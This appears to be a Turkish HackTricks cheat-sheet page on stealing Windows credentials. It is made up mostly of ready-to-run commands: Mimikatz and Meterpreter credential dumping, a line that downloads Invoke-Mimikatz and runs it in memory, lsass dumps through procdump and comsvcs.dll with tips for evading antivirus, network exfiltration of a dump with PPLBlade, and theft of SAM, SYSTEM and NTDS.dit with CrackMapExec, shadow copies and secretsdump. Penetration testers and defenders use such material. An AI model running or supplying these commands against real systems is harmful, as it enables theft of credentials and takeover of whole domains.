# Windows Kimlik Bilgilerini Çalma

<details>

<summary><strong>Sıfırdan kahramana AWS hacking öğrenmek için</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* **Şirketinizin HackTricks'te reklamını görmek** veya **HackTricks'i PDF olarak indirmek** istiyorsanız [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT**](https://opensea.io/collection/the-peass-family) koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'i keşfedin
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter**'da bizi takip edin 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **HackTricks** ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına PR göndererek hacking ipuçlarınızı paylaşın.

</details>

## Credentials Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Mimikatz'ın yapabileceği diğer şeyleri** [**bu sayfada**](credentials-mimikatz.md)**bulun**.

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Bazı olası kimlik bilgisi korumaları hakkında buradan bilgi edinin.**](credentials-protections.md) **Bu korumalar Mimikatz'in bazı kimlik bilgilerini çıkarmasını engelleyebilir.**

## Meterpreter ile Kimlik Bilgileri

Kurbanın içinde **parola ve hash aramak** için oluşturduğum [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **kullanın.**
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## AV Atlama

### Procdump + Mimikatz

**SysInternals'dan Procdump** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**meşru bir Microsoft aracıdır**, bu yüzden Defender tarafından tespit edilmez.\
Bu aracı kullanarak **lsass sürecini dökebilir**, **dökümü indirebilir** ve **dökümden yerel olarak kimlik bilgilerini çıkarabilirsiniz**.

{% code title="Dump lsass" %}
```bash
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
{% endcode %}

{% code title="Extract credentials from the dump" %}
```c
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
{% endcode %}

Bu işlem [SprayKatz](https://github.com/aas-n/spraykatz) ile otomatik olarak yapılır: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Not**: Bazı **AV**'ler **procdump.exe ile lsass.exe'yi dump etme** işlemini **kötü amaçlı** olarak **tespit edebilir**, bunun nedeni **"procdump.exe" ve "lsass.exe"** dizelerini **tespit etmeleridir**. Bu yüzden, procdump'a lsass.exe'nin **PID**'sini **isim yerine** **argüman** olarak **geçmek** daha **gizli** olur.

### **comsvcs.dll** ile lsass dump etme

`C:\Windows\System32`'de bulunan **comsvcs.dll** adlı bir DLL, bir çökme durumunda **işlem belleğini dump etmekten** sorumludur. Bu DLL, `rundll32.exe` kullanılarak çağrılmak üzere tasarlanmış **`MiniDumpW`** adlı bir **fonksiyon** içerir.\
İlk iki argümanı kullanmak önemsizdir, ancak üçüncü argüman üç bileşene ayrılır. Dump edilecek işlem kimliği ilk bileşeni oluşturur, dump dosyasının konumu ikinci bileşeni temsil eder ve üçüncü bileşen kesinlikle **full** kelimesidir. Başka seçenek yoktur.\
Bu üç bileşen çözüldüğünde, DLL dump dosyasını oluşturmak ve belirtilen işlemin belleğini bu dosyaya aktarmak için devreye girer.\
**comsvcs.dll**'nin kullanımı, procdump'ı yükleyip çalıştırmaya gerek kalmadan lsass işlemini dump etmek için uygundur. Bu yöntem, [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords) adresinde ayrıntılı olarak açıklanmıştır.

Aşağıdaki komut yürütme için kullanılır:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Bu süreci** [**lssasy**](https://github.com/Hackndo/lsassy)** ile otomatikleştirebilirsiniz.**

### **Task Manager ile lsass dökümü alma**

1. Görev Çubuğuna sağ tıklayın ve Görev Yöneticisi'ne tıklayın
2. Daha fazla ayrıntıya tıklayın
3. İşlemler sekmesinde "Local Security Authority Process" işlemini arayın
4. "Local Security Authority Process" işlemine sağ tıklayın ve "Döküm dosyası oluştur" seçeneğine tıklayın.

### procdump ile lsass dökümü alma

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump), [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) paketinin bir parçası olan Microsoft imzalı bir ikilidir.
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## PPLBlade ile lsass Dump Etme

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade), bellek dökümünü gizleyerek ve diske kaydetmeden uzaktaki iş istasyonlarına aktararak korunan bir işlem döküm aracıdır.

**Ana işlevler**:

1. PPL korumasını atlatma
2. Defender imza tabanlı tespit mekanizmalarından kaçınmak için bellek döküm dosyalarını gizleme
3. Bellek dökümünü diske kaydetmeden RAW ve SMB yükleme yöntemleriyle yükleme (filesiz dump)

{% code overflow="wrap" %}
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
{% endcode %}

## CrackMapExec

### Dump SAM hashes

SAM hash'lerini dök.
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### LSA sırlarını Dump etme
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Hedef DC'den NTDS.dit'i Dump Etme
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Hedef DC'den NTDS.dit parola geçmişini dökme
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Her NTDS.dit hesabı için pwdLastSet özniteliğini göster

```shell
dsquery * -filter "(&(objectCategory=person)(objectClass=user))" -attr samAccountName pwdLastSet
```
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## SAM & SYSTEM Çalma

Bu dosyalar _C:\windows\system32\config\SAM_ ve _C:\windows\system32\config\SYSTEM_ konumunda **bulunmalıdır.** Ancak **bu dosyaları normal bir şekilde kopyalayamazsınız** çünkü korunmaktadırlar.

### Kayıt Defterinden

Bu dosyaları çalmanın en kolay yolu, kayıt defterinden bir kopya almaktır:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Download** dosyaları Kali makinenize ve **hash'leri çıkarın** kullanarak:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Bu hizmeti kullanarak korunan dosyaların kopyasını alabilirsiniz. Yönetici olmanız gerekmektedir.

#### vssadmin Kullanarak

vssadmin binary sadece Windows Server sürümlerinde mevcuttur.
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Ancak aynı şeyi **Powershell** ile de yapabilirsiniz. Bu, **SAM dosyasını kopyalamanın** bir örneğidir (kullanılan sabit disk "C:" ve C:\users\Public'e kaydedilmiştir) ancak bu yöntemi korunan herhangi bir dosyayı kopyalamak için kullanabilirsiniz:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
$voume.Delete();if($notrunning -eq 1){$service.Stop()}
```
### Invoke-NinjaCopy

Son olarak, SAM, SYSTEM ve ntds.dit dosyalarının bir kopyasını oluşturmak için [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) kullanabilirsiniz.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory Credentials - NTDS.dit**

**NTDS.dit** dosyası, **Active Directory**'nin kalbi olarak bilinir ve kullanıcı nesneleri, gruplar ve üyelikleri hakkında kritik verileri tutar. Bu dosya, etki alanı kullanıcılarının **parola hash'lerini** saklar. Bu dosya, bir **Extensible Storage Engine (ESE)** veritabanıdır ve **_%SystemRoom%/NTDS/ntds.dit_** konumunda bulunur.

Bu veritabanında üç ana tablo bulunur:

- **Data Table**: Bu tablo, kullanıcılar ve gruplar gibi nesneler hakkında ayrıntıları saklamakla görevlidir.
- **Link Table**: Grup üyelikleri gibi ilişkileri takip eder.
- **SD Table**: Her nesne için **güvenlik tanımlayıcıları** burada tutulur, saklanan nesnelerin güvenliğini ve erişim kontrolünü sağlar.

Bu konuda daha fazla bilgi: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows, bu dosya ile etkileşim kurmak için _Ntdsa.dll_ kullanır ve bu dosya _lsass.exe_ tarafından kullanılır. Bu nedenle, **NTDS.dit** dosyasının **bir kısmı** **`lsass`** belleğinde bulunabilir (muhtemelen performans iyileştirmesi için bir **önbellek** kullanılarak en son erişilen verileri bulabilirsiniz).

#### NTDS.dit içindeki hash'leri deşifre etme

Hash 3 kez şifrelenmiştir:

1. Parola Şifreleme Anahtarını (**PEK**) **BOOTKEY** ve **RC4** kullanarak deşifre edin.
2. **Hash'i** **PEK** ve **RC4** kullanarak deşifre edin.
3. **Hash'i** **DES** kullanarak deşifre edin.

**PEK**, **her etki alanı denetleyicisinde** **aynı değere** sahiptir, ancak **NTDS.dit** dosyası içinde **etki alanı denetleyicisinin SYSTEM dosyasının BOOTKEY'i (etki alanı denetleyicileri arasında farklıdır)** kullanılarak şifrelenmiştir. Bu nedenle, NTDS.dit dosyasından kimlik bilgilerini almak için **NTDS.dit ve SYSTEM dosyalarına** (_C:\Windows\System32\config\SYSTEM_) ihtiyacınız vardır.

### Ntdsutil kullanarak NTDS.dit kopyalama

Windows Server 2008'den beri kullanılabilir.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
[**Volume shadow copy**](./#stealing-sam-and-system) hilesini kullanarak **ntds.dit** dosyasını da kopyalayabilirsiniz. Ayrıca **SYSTEM file**'ın bir kopyasına da ihtiyacınız olacağını unutmayın (yine, [**registry'den dump edin veya volume shadow copy**](./#stealing-sam-and-system) hilesini kullanın).

### **NTDS.dit dosyasından hash çıkarma**

**NTDS.dit** ve **SYSTEM** dosyalarını **elde ettikten** sonra, _secretsdump.py_ gibi araçları kullanarak **hash'leri çıkarabilirsiniz**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Ayrıca geçerli bir domain admin kullanıcısı kullanarak **otomatik olarak çıkarabilirsiniz**:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
**Büyük NTDS.dit dosyaları** için, [gosecretsdump](https://github.com/c-sto/gosecretsdump) kullanarak çıkartılması tavsiye edilir.

Son olarak, **metasploit modülü**: _post/windows/gather/credentials/domain\_hashdump_ veya **mimikatz** `lsadump::lsa /inject` kullanabilirsiniz.

### **NTDS.dit dosyasından SQLite veritabanına etki alanı nesnelerini çıkartma**

NTDS nesneleri, [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) ile bir SQLite veritabanına çıkartılabilir. Sadece sırlar değil, aynı zamanda ham NTDS.dit dosyası zaten alındığında daha fazla bilgi çıkartma için tüm nesneler ve onların öznitelikleri de çıkartılır.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
`SYSTEM` hive isteğe bağlıdır ancak sırların şifresini çözmeye olanak tanır (NT & LM hash'leri, düz metin parolalar, kerberos veya güven anahtarları, NT & LM parola geçmişleri gibi ek kimlik bilgileri). Diğer bilgilerle birlikte, aşağıdaki veriler çıkarılır: kullanıcı ve makine hesapları ve bunların hash'leri, UAC bayrakları, son oturum açma ve parola değişikliği için zaman damgası, hesap açıklamaları, adlar, UPN, SPN, gruplar ve özyinelemeli üyelikler, organizasyon birimleri ağacı ve üyelik, güvenilen alanlar ile güven türü, yönü ve öznitelikler...

## Lazagne

İkili dosyayı [buradan](https://github.com/AlessandroZ/LaZagne/releases) indirin. Bu ikili dosyayı çeşitli yazılımlardan kimlik bilgilerini çıkarmak için kullanabilirsiniz.
```
lazagne.exe all
```
## SAM ve LSASS'tan kimlik bilgilerini çıkarmak için diğer araçlar

### Windows credentials Editor (WCE)

Bu araç, kimlik bilgilerini bellekten çıkarmak için kullanılabilir. Şuradan indirebilirsiniz: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

SAM dosyasından kimlik bilgilerini çıkarın
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

SAM dosyasından kimlik bilgilerini çıkarın
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

İndirin: [http://www.tarasco.org/security/pwdump\_7](http://www.tarasco.org/security/pwdump\_7) ve sadece **çalıştırın**, şifreler çıkarılacaktır.

## Savunmalar

[**Bazı kimlik bilgisi korumalarını burada öğrenin.**](credentials-protections.md)

<details>

<summary><strong>Sıfırdan kahramana AWS hacking öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* **Şirketinizin HackTricks'te reklamını görmek** veya **HackTricks'i PDF olarak indirmek** istiyorsanız [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT**](https://opensea.io/collection/the-peass-family) koleksiyonumuz olan [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'i keşfedin
* **💬 Discord grubuna** [**katılın**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live) **bizi takip edin.**
* **HackTricks'e PR göndererek hacking ipuçlarınızı paylaşın** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına.

</details>
